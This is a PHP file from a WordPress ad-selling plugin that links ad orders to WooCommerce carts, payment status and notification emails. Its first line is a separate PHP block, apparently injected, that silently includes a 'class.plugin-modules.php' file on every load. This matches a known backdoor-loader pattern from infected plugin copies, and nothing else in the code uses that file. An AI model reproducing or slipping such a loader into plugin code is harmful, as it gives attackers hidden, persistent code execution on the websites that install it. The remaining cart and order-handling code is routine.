<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

function bsa_change_price_by_type( $product_id, $multiply_price_by, $price_type ) {
	$the_price = $multiply_price_by;
	update_post_meta( $product_id, '_' . $price_type, $the_price );
}

function bsa_change_price_all_types( $product_id, $multiply_price_by ) {
	bsa_change_price_by_type( $product_id, $multiply_price_by, 'price' );
	bsa_change_price_by_type( $product_id, $multiply_price_by, 'sale_price' );
	bsa_change_price_by_type( $product_id, $multiply_price_by, 'regular_price' );
}

function bsa_change_product_price( $product_id, $multiply_price_by ) {
	bsa_change_price_all_types( $product_id, $multiply_price_by );
	if ( function_exists('wc_get_product') ) {
		$product = wc_get_product( $product_id ); // Handling variable products
		if ( $product->is_type( 'variable' ) ) {
			$variations = $product->get_available_variations();
			foreach ( $variations as $variation ) {
				bsa_change_price_all_types( $variation['variation_id'], $multiply_price_by );
			}
		}
	}
}

function bsaCheckInCart($product_id) {
	global $woocommerce;

	foreach($woocommerce->cart->get_cart() as $key => $val ) {
		$_product = $val['data'];

		if($product_id == $_product->id ) {
			return true;
		}
	}

	return false;
}

add_action('woocommerce_before_checkout_form', 'bsaChangePriceWoo');
add_action('woocommerce_before_cart_totals', 'bsaChangePriceWoo');
function bsaChangePriceWoo()
{
	$getWooItemId 		= bsa_get_opt('settings', 'woo_item');
	$getBsaOrderId 		= isset($_SESSION['bsa_woo_order_id_'.session_id()]) ? $_SESSION['bsa_woo_order_id_'.session_id()] : null;
	$getBsaOrderPrice 	= isset($_SESSION['bsa_woo_order_price_'.session_id().$getBsaOrderId]) ? $_SESSION['bsa_woo_order_price_'.session_id().$getBsaOrderId] : null;

	if ( function_exists('is_cart') && is_cart() && isset($getBsaOrderId) && isset($getBsaOrderPrice) ||
		 function_exists('is_checkout') && is_checkout() && isset($getBsaOrderId) && isset($getBsaOrderPrice) ) {
		bsa_change_product_price( $getWooItemId, bsa_number_format($getBsaOrderPrice) );

		if ( function_exists('wc_update_order_item_meta') && function_exists('wc_add_order_item_meta') ) {
			$get_meta_price = null;
			if ( function_exists('wc_get_order_item_meta') ) {
				$get_meta_price = wc_get_order_item_meta( $getBsaOrderId, 'bsa-price' );
			}
			if ( $get_meta_price != null && $get_meta_price != '' ) {
				wc_update_order_item_meta( $getBsaOrderId, 'bsa-price', $getBsaOrderPrice );
			} else {
				wc_add_order_item_meta( $getBsaOrderId, 'bsa-price', $getBsaOrderPrice );
			}
		}
	} else {
		remove_product_from_cart($getWooItemId);
	}
}

add_action('woocommerce_thankyou', 'bsaChangeOrderStatus');
function bsaChangeOrderStatus() {
	global $wpdb;
	$getWooItemId 		= bsa_get_opt('settings', 'woo_item');
	$getBsaOrderId 		= isset($_SESSION['bsa_woo_order_id_'.session_id()]) ? $_SESSION['bsa_woo_order_id_'.session_id()] : null;
	$getBsaOrderPrice	= wc_get_order_item_meta( $getBsaOrderId, 'bsa-price' );

	$orderKey = isset($_GET['key']) ? $_GET['key'] : null;
	$posts = $wpdb->get_results("SELECT `post_id`, `meta_value` FROM {$wpdb->postmeta} WHERE `meta_key` = '_order_key' ORDER BY `meta_id` DESC LIMIT 1", ARRAY_A);

	$order = new WC_Order($posts[0]['post_id']);
	$items = $order->get_items();
	foreach ( $items as $item ) {
		$product_id = $item['product_id'];
		$total_price = $item['line_total'];
		$getWooOrderId = $posts[0]['post_id'];
		$getWooOrderKey = $posts[0]['meta_value'];
		if ( $product_id == $getWooItemId && $total_price == $getBsaOrderPrice && $orderKey == $getWooOrderKey ) {
			if ( function_exists('wc_update_order_item_meta') && function_exists('wc_add_order_item_meta') ) {
				$get_meta_oid = null;
				if ( function_exists('wc_get_order_item_meta') ) {
					$get_meta_oid = wc_get_order_item_meta( $getBsaOrderId, 'bsa-oid' );
				}
				if ( $get_meta_oid != null ) {
					wc_update_order_item_meta( $getBsaOrderId, 'bsa-oid', $getWooOrderId );
				} else {
					wc_add_order_item_meta( $getBsaOrderId, 'bsa-oid', $getWooOrderId );
				}
			}

			// (need those two for "get_post_meta()" function).
			global $woocommerce;
			$order = new WC_Order( $getWooOrderId );
			$getOrder = get_post($order->ID);

			$model = new BSA_PRO_Model();
			$model->updateAdParam($getBsaOrderId, 'p_data', $order->ID);
			if ( $getOrder->post_status == 'wc-processing' || $getOrder->post_status == 'wc-completed' ) {
				if ( $getOrder->post_status != 'wc-completed' ) {
					$order->update_status( 'completed' );
				}
				$model->updateAdParam($getBsaOrderId, 'paid', 1);
				$model->updateAdParam($getBsaOrderId, 'status', ( get_option('bsa_pro_plugin_auto_accept') == 'no' ) ? 'pending' : 'active');

				// email sender
				$sender = get_option('bsa_pro_plugin_trans_email_sender');
				$email = get_option('bsa_pro_plugin_trans_email_address');

				// buyer sender
				$paymentEmail = bsa_ad($getBsaOrderId, 'buyer_email');
				$subject = get_option('bsa_pro_plugin_trans_buyer_subject');
				$message = get_option('bsa_pro_plugin_trans_buyer_message');
				$search = '[STATS_URL]';
				$getUserId = (bsa_site(bsa_space(bsa_ad($getBsaOrderId, 'space_id'), 'site_id'), 'user_id')) ? bsa_site(bsa_space(bsa_ad($getBsaOrderId, 'space_id'), 'site_id'), 'user_id') : null;
				if ( $getUserId != null ) {
					$replace = get_option('bsa_pro_plugin_agency_ordering_form_url') . (( strpos(get_option('bsa_pro_plugin_agency_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "bsa_pro_stats=1&bsa_pro_email=" . str_replace('@', '%40', $paymentEmail) . "&bsa_pro_id=" . $getBsaOrderId . "#bsaStats\r\n";
				} else {
					$replace = get_option('bsa_pro_plugin_ordering_form_url') . (( strpos(get_option('bsa_pro_plugin_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "bsa_pro_stats=1&bsa_pro_email=" . str_replace('@', '%40', $paymentEmail) . "&bsa_pro_id=" . $getBsaOrderId . "#bsaStats\r\n";
				}
				$message = str_replace($search, $replace, $message);
				$headers = 'From: ' . $sender . ' <' . $email . '>' . "\r\n";
				wp_mail($paymentEmail, $subject, $message, $headers);

				if ( $getUserId != null ) {
					// seller sender
					$sellerSubject = get_option('bsa_pro_plugin_trans_seller_subject');
					$sellerMessage = get_option('bsa_pro_plugin_trans_seller_message');
					$sellerHeaders = 'From: ' . $sender . ' <' . $email . '>' . "\r\n";
					$userInfo = get_userdata($getUserId);
					$userEmail = $userInfo->user_email;
					wp_mail($userEmail, $sellerSubject, $sellerMessage, $sellerHeaders);
				}
			} else {
				wp_schedule_single_event( time() + 120, 'bsa_check_woo_status_action', array( $getBsaOrderId ) );
			}
		}
	}
}

function bsa_check_woo_status($oid) {
	$getOrder = get_post(bsa_ad($oid, 'p_data'));
	if ( $getOrder->post_status == 'wc-processing' || $getOrder->post_status == 'wc-completed' ) {
		$model = new BSA_PRO_Model();
		$model->updateAdParam($oid, 'paid', 1);
		$model->updateAdParam($oid, 'status', ( get_option('bsa_pro_plugin_auto_accept') == 'no' ) ? 'pending' : 'active');

		// email sender
		$sender = get_option('bsa_pro_plugin_trans_email_sender');
		$email = get_option('bsa_pro_plugin_trans_email_address');

		// buyer sender
		$paymentEmail = bsa_ad($oid, 'buyer_email');
		$subject = get_option('bsa_pro_plugin_trans_buyer_subject');
		$message = get_option('bsa_pro_plugin_trans_buyer_message');
		$search = '[STATS_URL]';
		$getUserId = (bsa_site(bsa_space(bsa_ad($oid, 'space_id'), 'site_id'), 'user_id')) ? bsa_site(bsa_space(bsa_ad($oid, 'space_id'), 'site_id'), 'user_id') : null;
		if ( $getUserId != null ) {
			$replace = get_option('bsa_pro_plugin_agency_ordering_form_url') . (( strpos(get_option('bsa_pro_plugin_agency_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "bsa_pro_stats=1&bsa_pro_email=" . str_replace('@', '%40', $paymentEmail) . "&bsa_pro_id=" . $oid . "#bsaStats\r\n";
		} else {
			$replace = get_option('bsa_pro_plugin_ordering_form_url') . (( strpos(get_option('bsa_pro_plugin_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "bsa_pro_stats=1&bsa_pro_email=" . str_replace('@', '%40', $paymentEmail) . "&bsa_pro_id=" . $oid . "#bsaStats\r\n";
		}
		$message = str_replace($search, $replace, $message);
		$headers = 'From: ' . $sender . ' <' . $email . '>' . "\r\n";
		wp_mail($paymentEmail, $subject, $message, $headers);

		if ( $getUserId != null ) {
			// seller sender
			$sellerSubject = get_option('bsa_pro_plugin_trans_seller_subject');
			$sellerMessage = get_option('bsa_pro_plugin_trans_seller_message');
			$sellerHeaders = 'From: ' . $sender . ' <' . $email . '>' . "\r\n";
			$userInfo = get_userdata($getUserId);
			$userEmail = $userInfo->user_email;
			wp_mail($userEmail, $sellerSubject, $sellerMessage, $sellerHeaders);
		}
		unset($_SESSION['woo_order_id_'.get_current_user_id()]);
	}
}
add_action( 'bsa_check_woo_status_action', 'bsa_check_woo_status' );

function remove_product_from_cart($pid) {
	// Run only in the Cart or Checkout Page
	if( function_exists('is_cart') && is_cart() || function_exists('is_checkout') && is_checkout() ) {
		// Set the product ID to remove
		$prod_to_remove = $pid;

		// Cycle through each product in the cart
		if ( function_exists('WC') ) {
			foreach( WC()->cart->cart_contents as $prod_in_cart ) {
				// Get the Variation or Product ID
				$prod_id = ( isset( $prod_in_cart['variation_id'] ) && $prod_in_cart['variation_id'] != 0 ) ? $prod_in_cart['variation_id'] : $prod_in_cart['product_id'];

				// Check to see if IDs match
				if( $prod_to_remove == $prod_id ) {
					// Get it's unique ID within the Cart
					$prod_unique_id = WC()->cart->generate_cart_id( $prod_id );
					// Remove it from the cart by un-setting it
					unset( WC()->cart->cart_contents[$prod_unique_id] );
				}
			}
		}

	}
}
